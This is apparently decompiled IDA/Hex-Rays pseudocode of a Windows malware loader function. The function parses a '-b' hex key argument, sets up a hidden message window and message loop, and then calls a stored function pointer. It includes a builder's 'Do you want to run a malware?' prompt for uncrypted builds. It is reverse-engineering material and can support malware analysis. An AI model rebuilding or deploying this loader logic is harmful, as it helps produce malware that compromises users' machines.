_UNKNOWN **__stdcall sub_40A560(HINSTANCE hInstance, LPCCH lpMultiByteStr, int a3)
{
    // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

    v18 = 0;
    v17 = nullptr;
    memset(Param, 0, sizeof(Param));
    v3 = 0xA0716E5B;
    if ( !lpMultiByteStr )
        v3 = 0xEC71CA67;

    pNumArgs[3] = v3;
    if ( lpMultiByteStr )
    {
        v10 = MultiByteToWideChar(0, 0, lpMultiByteStr, 0xFFFFFFFF, nullptr, 0);
        v11 = (const WCHAR *)calloc(v10, 2u);
        lpCmdLine = v11;
        if ( v11 )
        {
            pNumArgs[0] = 0;
            hMem = CommandLineToArgvW(lpCmdLine, pNumArgs);
            if ( hMem )
            {
                for ( i = 0; i < pNumArgs[0]; ++i )
                {
                    if ( hMem[i]
                      && lstrlenW(hMem[i]) == 0x42
                      && *hMem[i] == 0x2D
                      && hMem[i][1] == 0x62 )
                    {
                        v26 = (int)(hMem[i] + 2);
                        for ( j = 0; j < 0x40; j = j - 0x1777AB63 + 0x1777AB65 )
                        {
                            v7 = (unsigned __int16 *)(v26 + 2 * j);
                            v8 = sub_40C8B0(*v7);
                            v9 = sub_40C8B0(v7[1]);
                            if ( v8 >= 0x10u || v9 >= 0x10u )
                            {
                                v21 = 5;
                            }
                            else
                            {
                                v32[j / 2] = v9 | (0x10 * v8);
                                v21 = 0;
                            }

                            v24 = v21;
                            if ( v24 == 5 )
                                break;
                        }

                        if ( j == 0x40 )
                            v18 = 1;
                        else
                            memset(v32, 0, sizeof(v32));
                    }
                }

                LocalFree(hMem);
            }

            free((void *)lpCmdLine);
        }
    }

    v31 = &off_47B9C8;
    v28[1] = 0;
    v28[0] = 0;
    v29 = 0;
    v28[2] = &unk_48A99C;
    v28[3] = dword_40CDA0;
    v28[5] = &v31;
    v28[6] = hInstance;
    v28[7] = a3;
    v28[4] = sub_40CF90;
    WndClass.style = 3;
    WndClass.lpfnWndProc = (WNDPROC)dword_40D200;
    WndClass.cbClsExtra = 0;
    WndClass.cbWndExtra = 0;
    WndClass.hInstance = hInstance;
    WndClass.hIcon = LoadIconA(nullptr, (LPCSTR)0x7F00);
    WndClass.hCursor = LoadCursorA(nullptr, (LPCSTR)0x7F00);
    WndClass.hbrBackground = (HBRUSH)GetStockObject(0);
    WndClass.lpszMenuName = nullptr;
    WndClass.lpszClassName = WindowName;
    dword_48E02C = (int)&dword_48E028;
    dword_48E028 = (int)&dword_48E028;
    v27[1] = v27;
    v27[0] = v27;
    Param[0x5C] = 0;
    Param[0x17] = 0;
    Param[0x5F] = 0;
    Param[0x18] = 0;
    Param[2] = v27;
    Param[0] = 0;
    Param[0x16] = &v17;
    Param[1] = malloc(0x40000u);
    if ( Param[1] )
    {
        v19 = 1;
        RegisterClassW(&WndClass);
        memset((void *)Param[1], 0, 0x40000u);
        Param[0x1F] = 0;
        Param[0x1E] = 0;
        Param[4] = v28;
        Param[3] = &v31;
        sub_419808(WindowName, 0x1C, &Param[0xD]);
        if ( v18 )
        {
            sub_405E50(v37);
            v36 = v37;
            sub_4069C0(v35, &Param[0xD]);
            sub_406B80(v35, 0x20, v32, &Param[5]);
        }

        else if ( sub_40F830()
               && MessageBoxW(
                      nullptr,
                      L"Do you want to run a malware?\n(Crypt build to disable this message)",
                      L"Warning",
                      0x34u) == 7 )
        {
            v19 = 0;
        }

        if ( v19 )
        {
            DesktopWindow = GetDesktopWindow();
            if ( DesktopWindow )
                GetWindowThreadProcessId(DesktopWindow, &Param[0x19]);

            Param[0x17] = calloc(1u, 0x7538u);
            pNumArgs[2] = 0xCF0000;
            pNumArgs[1] = 0x80000000;
            CreateWindowExW(
                0,
                WindowName,
                WindowName,
                0xCF0000u,
                0x80000000,
                0x80000000,
                0x1F4,
                0x12C,
                HWND_MESSAGE,
                nullptr,
                hInstance,
                Param);
            while ( GetMessageA(&Msg, nullptr, 0, 0) )
            {
                TranslateMessage(&Msg);
                DispatchMessageA(&Msg);
            }

            free((void *)Param[1]);
            if ( v17 && Param[4] )
            {
                v25 = v17;
                v17(v28);
            }
        }
    }

    if ( Param[0x18] )
        free((void *)Param[0x18]);

    if ( Param[0x5F] )
        free((void *)Param[0x5F]);

    if ( Param[0x17] )
        free((void *)Param[0x17]);

    while ( (int *)dword_48E028 != &dword_48E028 )
    {
        v4 = (_DWORD *)dword_48E028;
        v5 = *(_DWORD *)dword_48E028;
        v6 = *(_DWORD **)(dword_48E028 + 4);
        *v6 = *(_DWORD *)dword_48E028;
        *(_DWORD *)(v5 + 4) = v6;
        v22 = v4;
        if ( v4[2] )
            (*((void (__stdcall **)(_DWORD, _DWORD, int))v22 + 2))(*((_DWORD *)v22 + 4), 0, 0x8000);

        free(v22);
    }

    return &off_48B8A4;
}
